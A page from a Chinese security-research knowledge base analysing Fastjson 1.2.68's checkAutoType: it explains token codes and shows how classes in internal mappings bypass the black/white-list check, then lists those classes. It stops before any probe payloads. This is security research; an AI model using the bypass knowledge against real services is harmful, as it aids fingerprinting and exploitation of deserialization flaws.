
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>05.Fastjson的dnslog探测方式分析 · d4m1ts's知识库</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        <meta name="author" content="d4m1ts">
        
        
    
    <link rel="stylesheet" href="../../../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-search-plus/search.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-splitter/splitter.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-page-treeview/style.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-donate/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-code/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-pageview-count/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-ancre-navigation/style/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-insert-logo/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="06.Fastjson各版本漏洞分析.html" />
    
    
    <link rel="prev" href="04.Fastjson 1.2.24反序列化漏洞分析.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../../../">
            
                <a href="../../../../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" >
            
                <span>
            
                    
                    02.代码审计
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" >
            
                <span>
            
                    
                    01.Java安全
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1.1" >
            
                <span>
            
                    
                    1.审计基础
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1.1.1" data-path="../1.审计基础/01.JVM类加载机制.html">
            
                <a href="../1.审计基础/01.JVM类加载机制.html">
            
                    
                    01.JVM类加载机制
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.1.2" data-path="../1.审计基础/02.Java反射机制.html">
            
                <a href="../1.审计基础/02.Java反射机制.html">
            
                    
                    02.Java反射机制
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.1.3" data-path="../1.审计基础/03.Java序列化与反序列化.html">
            
                <a href="../1.审计基础/03.Java序列化与反序列化.html">
            
                    
                    03.Java序列化与反序列化
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.1.4" data-path="../1.审计基础/04.RMI基础.html">
            
                <a href="../1.审计基础/04.RMI基础.html">
            
                    
                    04.RMI基础
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.1.5" data-path="../1.审计基础/05.JNDI注入.html">
            
                <a href="../1.审计基础/05.JNDI注入.html">
            
                    
                    05.JNDI注入
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.1.6" data-path="../1.审计基础/06.IDEA断点调试.html">
            
                <a href="../1.审计基础/06.IDEA断点调试.html">
            
                    
                    06.IDEA断点调试
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.1.7" data-path="../1.审计基础/07.Java加载字节码.html">
            
                <a href="../1.审计基础/07.Java加载字节码.html">
            
                    
                    07.Java加载字节码
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.1.8" data-path="../1.审计基础/08.javassist字节码编程.html">
            
                <a href="../1.审计基础/08.javassist字节码编程.html">
            
                    
                    08.javassist字节码编程
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.1.9" data-path="../1.审计基础/09.EL表达式.html">
            
                <a href="../1.审计基础/09.EL表达式.html">
            
                    
                    09.EL表达式
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.1.10" data-path="../1.审计基础/10.SpEL表达式.html">
            
                <a href="../1.审计基础/10.SpEL表达式.html">
            
                    
                    10.SpEL表达式
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.1.11" data-path="../1.审计基础/11.OGNL表达式.html">
            
                <a href="../1.审计基础/11.OGNL表达式.html">
            
                    
                    11.OGNL表达式
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.1.12" data-path="../1.审计基础/12.IDEA调试JAR.html">
            
                <a href="../1.审计基础/12.IDEA调试JAR.html">
            
                    
                    12.IDEA调试JAR
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.2.1.2" >
            
                <span>
            
                    
                    2.各种分析
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1.2.1" data-path="01.Apache_Commons_Collections中的反序列化.html">
            
                <a href="01.Apache_Commons_Collections中的反序列化.html">
            
                    
                    01.Apache_Commons_Collections中的反序列化
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.2.2" data-path="02.URLDNS链分析.html">
            
                <a href="02.URLDNS链分析.html">
            
                    
                    02.URLDNS链分析
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.2.3" data-path="03.log4j反序列化漏洞分析.html">
            
                <a href="03.log4j反序列化漏洞分析.html">
            
                    
                    03.log4j反序列化漏洞分析
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.2.4" data-path="04.Fastjson 1.2.24反序列化漏洞分析.html">
            
                <a href="04.Fastjson 1.2.24反序列化漏洞分析.html">
            
                    
                    04.Fastjson 1.2.24反序列化漏洞分析
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.2.1.2.5" data-path="05.Fastjson的dnslog探测方式分析.html">
            
                <a href="05.Fastjson的dnslog探测方式分析.html">
            
                    
                    05.Fastjson的dnslog探测方式分析
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.2.6" data-path="06.Fastjson各版本漏洞分析.html">
            
                <a href="06.Fastjson各版本漏洞分析.html">
            
                    
                    06.Fastjson各版本漏洞分析
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.2.7" data-path="07.Fastjson1.2.68分析.html">
            
                <a href="07.Fastjson1.2.68分析.html">
            
                    
                    07.Fastjson1.2.68分析
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.2.8" data-path="08.ysoserial-C3P0分析.html">
            
                <a href="08.ysoserial-C3P0分析.html">
            
                    
                    08.ysoserial-C3P0分析
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.2.9" data-path="09.log4j2_rce分析.html">
            
                <a href="09.log4j2_rce分析.html">
            
                    
                    09.log4j2_rce分析
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.2.1.3" >
            
                <span>
            
                    
                    3.内存马
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1.3.1" data-path="../3.内存马/01.Tomcat内存马.html">
            
                <a href="../3.内存马/01.Tomcat内存马.html">
            
                    
                    01.Tomcat内存马
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.3.2" data-path="../3.内存马/02.Spring内存马.html">
            
                <a href="../3.内存马/02.Spring内存马.html">
            
                    
                    02.Spring内存马
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.3.3" data-path="../3.内存马/03.Java Agent 内存马.html">
            
                <a href="../3.内存马/03.Java Agent 内存马.html">
            
                    
                    03.Java Agent 内存马
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../../../../更新日志.html">
            
                <a href="../../../../更新日志.html">
            
                    
                    更新日志
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../../../../友情链接.html">
            
                <a href="../../../../友情链接.html">
            
                    
                    友情链接
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../../../.." >05.Fastjson的dnslog探测方式分析</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div class="search-plus" id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <html><head></head><body><div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><ul><li><span class="title-icon "></span><a href="#&#x524D;&#x8A00;"><b>1.1. </b>&#x524D;&#x8A00;</a></li><li><span class="title-icon "></span><a href="#&#x8BF4;&#x660E;"><b>1.2. </b>&#x8BF4;&#x660E;</a></li><li><span class="title-icon "></span><a href="#&#x5206;&#x6790;"><b>1.3. </b>&#x5206;&#x6790;</a></li><li><span class="title-icon "></span><a href="#&#x6316;&#x6398;"><b>1.4. </b>&#x6316;&#x6398;</a></li><ul><li><span class="title-icon "></span><a href="#javanetinetsocketaddress"><b>1.4.1. </b>java.net.InetSocketAddress</a></li><li><span class="title-icon "></span><a href="#javanetinet4address"><b>1.4.2. </b>java.net.Inet4Address</a></li><li><span class="title-icon "></span><a href="#javanetinet6address"><b>1.4.3. </b>java.net.Inet6Address</a></li><li><span class="title-icon "></span><a href="#javaneturl"><b>1.4.4. </b>java.net.URL</a></li><li><span class="title-icon "></span><a href="#javaneturi"><b>1.4.5. </b>java.net.URI</a></li></ul><li><span class="title-icon "></span><a href="#&#x603B;&#x7ED3;"><b>1.5. </b>&#x603B;&#x7ED3;</a></li><li><span class="title-icon "></span><a href="#&#x53C2;&#x8003;&#x6587;&#x732E;"><b>1.6. </b>&#x53C2;&#x8003;&#x6587;&#x732E;</a></li></ul></ul></div><a href="#" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><div class="treeview__container"><div class="treeview__container-title"><span class="treeview__main-title">Treeview</span><span class="treeview__copyright">Copyright &#xA9; d4m1ts all right reserved, powered by <a href="https://github.com/aleen42" target="_blank">aleen42</a></span></div><ul>
<li><div><a href="#&#x524D;&#x8A00;">&#x524D;&#x8A00;</a><i></i></div></li>
<li><div><a href="#&#x8BF4;&#x660E;">&#x8BF4;&#x660E;</a><i></i></div></li>
<li><div><a href="#&#x5206;&#x6790;">&#x5206;&#x6790;</a><i></i></div></li>
<li><div><a href="#&#x6316;&#x6398;">&#x6316;&#x6398;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
<ul>
<li><div><a href="#javanetinetsocketaddress">java.net.InetSocketAddress</a><i></i></div></li>
<li><div><a href="#javanetinet4address">java.net.Inet4Address</a><i></i></div></li>
<li><div><a href="#javanetinet6address">java.net.Inet6Address</a><i></i></div></li>
<li><div><a href="#javaneturl">java.net.URL</a><i></i></div></li>
<li><div><a href="#javaneturi">java.net.URI</a><i></i></div></li>
</ul></li>
<li><div><a href="#&#x603B;&#x7ED3;">&#x603B;&#x7ED3;</a><i></i></div></li>
<li><div><a href="#&#x53C2;&#x8003;&#x6587;&#x732E;">&#x53C2;&#x8003;&#x6587;&#x732E;</a><i></i></div></li>
</ul>
</div>

<h2 id="&#x524D;&#x8A00;"><a name="&#x524D;&#x8A00;" class="anchor-navigation-ex-anchor" href="#&#x524D;&#x8A00;"><i class="fa fa-link" aria-hidden="true"></i></a>1.1. &#x524D;&#x8A00;</h2>
<p>&#x6B63;&#x5E38;&#x6D4B;&#x8BD5;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53D1;&#x73B0;java&#x540E;&#x7AEF;&#x5BF9;json&#x5904;&#x7406;&#x90FD;&#x4F1A;&#x53BB;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x662F;&#x5426;&#x5B58;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x4F46;&#x662F;&#x540E;&#x7AEF;&#x5904;&#x7406;json&#x7684;&#x7EC4;&#x4EF6;&#x5F88;&#x591A;&#xFF0C;&#x6BD4;&#x5982;<code>fastjson</code>&#x3001;<code>jackson</code>&#x3001;<code>gson</code>&#x7B49;&#xFF0C;&#x600E;&#x4E48;&#x5224;&#x65AD;&#x662F;&#x5426;&#x4F7F;&#x7528;&#x4E86;<code>fastjson</code>&#x5462;&#xFF1F;</p>
<p>&#x6709;&#x4E00;&#x4E2A;&#x7B80;&#x4FBF;&#x65E0;&#x5371;&#x5BB3;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x5C31;&#x662F;&#x901A;&#x8FC7;dnslog&#x6765;&#x5224;&#x65AD;&#x3002;</p>
<p>&#x5927;&#x4F6C;&#x4EEC;&#x8BA8;&#x8BBA;&#x7684;<a href="https://github.com/alibaba/fastjson/issues/3077" target="_blank"><code>issue</code></a></p>
<h2 id="&#x8BF4;&#x660E;"><a name="&#x8BF4;&#x660E;" class="anchor-navigation-ex-anchor" href="#&#x8BF4;&#x660E;"><i class="fa fa-link" aria-hidden="true"></i></a>1.2. &#x8BF4;&#x660E;</h2>
<p>&#x524D;&#x9762;&#x6211;&#x4EEC;&#x5728;&#x5206;&#x6790;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x53D1;&#x73B0;&#x5F88;&#x591A;&#x6709;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;<code>token</code>&#x5728;&#x8FDB;&#x884C;&#x5224;&#x65AD;&#xFF0C;&#x6BD4;&#x5982;token == 12 &#x6216;&#x8005; token == 14&#x7B49;&#xFF0C;&#x90A3;&#x8FD9;&#x4E2A;token&#x5230;&#x5E95;&#x4EE3;&#x8868;&#x5565;&#x5462;&#xFF1F;&#x5728;<code>com.alibaba.fastjson.parser.JSONToken</code>&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x7B54;&#x6848;</p>
<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">name</span><span class="hljs-params">(<span class="hljs-keyword">int</span> value)</span> </span>{
        <span class="hljs-keyword">switch</span>(value) {
        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;int&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;float&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;string&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;iso8601&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;true&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;false&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;null&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;new&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">10</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;(&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">11</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;)&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">12</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;{&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">13</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;}&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">14</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">15</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;]&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;,&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">17</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;:&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">18</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ident&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">19</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fieldName&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">20</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;EOF&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">21</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Set&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">22</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;TreeSet&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">23</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;undefined&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">24</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;;&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">25</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;.&quot;</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">26</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hex&quot;</span>;
        <span class="hljs-keyword">default</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unknown&quot;</span>;
        }
    }
</code></pre>
<h2 id="&#x5206;&#x6790;"><a name="&#x5206;&#x6790;" class="anchor-navigation-ex-anchor" href="#&#x5206;&#x6790;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3. &#x5206;&#x6790;</h2>
<ul>
<li>fastjson 1.2.68</li>
<li>jdk 8u261</li>
</ul>
<p>&#x5206;&#x6790;&#x4E00;&#x4E0B;<code>checkAutoType</code></p>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020103325185.png" data-lightbox="9f8daf33-b2dc-4292-9887-054539ed4bfd" data-title="image-20211020103325185"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020103325185.png" alt="image-20211020103325185"></a></p>
<p>&#x8FD9;&#x4E2A;&#x9ED1;&#x540D;&#x5355;&#x68C0;&#x6D4B;&#x7ED5;&#x8FC7;&#x540E;&#xFF0C;&#x4F1A;&#x6765;&#x5230;&#x5982;&#x4E0B;&#x51E0;&#x4E2A;if&#x8BED;&#x53E5;&#xFF0C;&#x5199;&#x4E86;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x6CE8;&#x91CA;</p>
<pre><code class="lang-java"><span class="hljs-comment">// &#x4ECE;ConcurrentHashMap&#x7C7B;&#x53D8;&#x91CF;mapping&#x4E2D;&#x5C1D;&#x8BD5;&#x83B7;&#x53D6;&#x8FD9;&#x4E2A;&#x7C7B;&#xFF0C;mappings&#x6709;&#x70B9;&#x50CF;&#x7EF4;&#x62A4;&#x7684;&#x4E00;&#x4E2A;&#x57FA;&#x7840;&#x7C7B;&#x5E93;</span>
clazz = TypeUtils.getClassFromMapping(typeName);
<span class="hljs-comment">// &#x5982;&#x679C;mapping&#x91CC;&#x9762;&#x6CA1;&#x6709;&#x8FD9;&#x4E2A;&#x7C7B;&#xFF0C;&#x5C31;&#x4F1A;&#x5C1D;&#x8BD5;&#x4ECE;this.deserializers.buckets&#x8FD9;&#x4E2A;IdentityHashMap&#x7C7B;&#x7684;Map&#x4E2D;&#x5C1D;&#x8BD5;&#x83B7;&#x53D6;clazz&#xFF0C;&#x8FD9;&#x4E2A;&#x6709;&#x70B9;&#x50CF;&#x5F00;&#x53D1;&#x8005;&#x7EF4;&#x62A4;&#x7684;&#x4E00;&#x4E2A;&#x53EF;&#x4FE1;&#x4EFB;&#x7C7B;</span>
<span class="hljs-keyword">if</span> (clazz == <span class="hljs-keyword">null</span>) {
     clazz = <span class="hljs-keyword">this</span>.deserializers.findClass(typeName);
 }
<span class="hljs-comment">// &#x5982;&#x679C;clazz&#x8FD8;&#x662F;&#x4E3A;null&#xFF0C;&#x5C31;&#x4F1A;&#x5C1D;&#x8BD5;&#x4ECE;this.typeMapping&#x4E2D;&#x53BB;&#x83B7;&#x53D6;&#x7C7B;&#xFF0C;&#x4F46;&#x8FD9;&#x4E2A;&#x7C7B;&#x9ED8;&#x8BA4;&#x662F;&#x7A7A;&#x7684;</span>
 <span class="hljs-keyword">if</span> (clazz == <span class="hljs-keyword">null</span>) {
     clazz = (Class)<span class="hljs-keyword">this</span>.typeMapping.get(typeName);
 }
<span class="hljs-comment">// &#x5982;&#x679C;&#x5728;&#x767D;&#x540D;&#x5355;&#xFF0C;&#x5C31;&#x76F4;&#x63A5;&#x52A0;&#x8F7D;&#x8FD9;&#x4E2A;clazz</span>
 <span class="hljs-keyword">if</span> (internalWhite) {
     clazz = TypeUtils.loadClass(typeName, <span class="hljs-keyword">this</span>.defaultClassLoader, <span class="hljs-keyword">true</span>);
 }
<span class="hljs-comment">// &#x5982;&#x679C;clazz&#x4E0D;&#x4E3A;null&#xFF0C;&#x4E14;&#x4E0D;&#x6EE1;&#x8DB3;&#x540E;&#x7EED;&#x7684;&#x5224;&#x5B9A;&#x6761;&#x4EF6;&#xFF0C;&#x5C31;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;clazz</span>
 <span class="hljs-keyword">if</span> (clazz != <span class="hljs-keyword">null</span>) {
     <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-keyword">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) {
         <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());
     } <span class="hljs-keyword">else</span> {
         <span class="hljs-keyword">return</span> clazz;
     }
 }
</code></pre>
<p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x80FD;&#x5728;&#x4E0A;&#x9762;&#x7684;&#x51E0;&#x4E2A;Map&#x4E2D;&#x627E;&#x5230;&#x4E00;&#x4E9B;&#x53EF;&#x5229;&#x7528;&#x7684;&#x7C7B;&#xFF0C;&#x90A3;&#x4E48;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF08;&#x5173;&#x95ED;autoType&#x7684;&#x60C5;&#x51B5;&#xFF09;&#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x9ED1;&#x767D;&#x540D;&#x5355;&#x68C0;&#x67E5;&#xFF0C;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;<code>clazz</code>&#x8FDB;&#x5165;&#x540E;&#x7EED;&#x64CD;&#x4F5C;</p>
<p>&#x5206;&#x6790;&#x4E00;&#x4E0B;&#x91CC;&#x9762;&#x4E00;&#x5171;&#x6709;&#x54EA;&#x4E9B;&#x7C7B;</p>
<ul>
<li>mappings</li>
</ul>
<pre><code class="lang-java">((ConcurrentHashMap) mappings).keySet()
</code></pre>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020112223003.png" data-lightbox="6c9e9719-7da9-457e-88fc-80587a19a3a7" data-title="image-20211020112223003"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020112223003.png" alt="image-20211020112223003"></a></p>
<ul>
<li>this.buckets</li>
</ul>
<pre><code class="lang-java">Object[] a = <span class="hljs-keyword">new</span> Object[<span class="hljs-number">9000</span>];
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>.buckets.length; ++i) {
            IdentityHashMap.Entry bucket = <span class="hljs-keyword">this</span>.buckets[i];
            <span class="hljs-keyword">if</span> (bucket != <span class="hljs-keyword">null</span>) {
                <span class="hljs-keyword">for</span>(IdentityHashMap.Entry entry = bucket; entry != <span class="hljs-keyword">null</span>; entry = entry.next) {
                    Object key = bucket.key;
                    a[i] = key.name;
                }
            }
        }
<span class="hljs-keyword">return</span> a;
</code></pre>
<p><a href="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020112646499.png" data-lightbox="656a5df0-54e1-4aa2-9ec4-da10704dd8e7" data-title="image-20211020112646499"><img src="14.fastjson&#x7684;dnslog&#x63A2;&#x6D4B;&#x65B9;&#x5F0F;&#x5206;&#x6790;.assets/image-20211020112646499.png" alt="image-20211020112646499"></a></p>
<ul>
<li>this.typeMapping</li>
</ul>
<p>&#x9ED8;&#x8BA4;&#x4E3A;&#x7A7A;</p>
<p>&#x6C47;&#x603B;&#x4E00;&#x4E0B;&#x6240;&#x6709;&#x7C7B;&#xFF1A;</p>
<pre><code class="lang-class">java.lang.IndexOutOfBoundsException
java.lang.Integer
java.lang.NoSuchFieldException
java.lang.Long
java.math.BigInteger
java.lang.LinkageError
java.lang.StringIndexOutOfBoundsException
java.lang.StackOverflowError
long
java.lang.VerifyError
java.util.LinkedHashMap
java.util.Calendar
java.lang.StackTraceElement
[long
java.lang.NoSuchMethodError
java.util.concurrent.atomic.AtomicLong
java.util.TreeMap
java.util.Date
java.lang.NoSuchFieldError
java.util.concurrent.atomic.AtomicInteger
java.lang.Short
java.util.Locale
java.lang.InstantiationException
java.lang.SecurityException
java.sql.Timestamp
java.util.concurrent.ConcurrentHashMap
java.util.UUID
java.lang.IllegalAccessError
com.alibaba.fastjson.JSONObject
[short
java.util.HashSet
[byte
java.lang.Boolean
java.sql.Date
short
java.lang.Object
java.util.BitSet
[char
java.lang.Float
java.math.BigDecimal
java.lang.Character
java.lang.InternalError
[double
byte
double
java.lang.Exception
java.lang.Double
[B
java.lang.TypeNotPresentException
[C
[D
java.text.SimpleDateFormat
[F
[I
java.util.TreeSet
[J
java.util.ArrayList
java.lang.IllegalMonitorStateException
com.alibaba.fastjson.JSONArray
[S
java.lang.String
java.lang.Number
java.util.LinkedHashSet
[Z
java.lang.NegativeArraySizeException
java.lang.NumberFormatException
java.lang.RuntimeException
char
java.lang.OutOfMemoryError
java.lang.IllegalStateException
java.sql.Time
java.lang.NoSuchMethodException
java.util.Collections$EmptyMap
[boolean
float
java.lang.AutoCloseable
java.lang.NullPointerException
java.lang.Byte
[int
com.alibaba.fastjson.JSONPObject
java.lang.Cloneable
java.lang.IllegalAccessException
java.util.IdentityHashMap
java.util.HashMap
java.lang.NoClassDefFoundError
java.util.Hashtable
java.util.WeakHashMap
java.lang.IllegalThreadStateException
java.lang.IllegalArgumentException
int
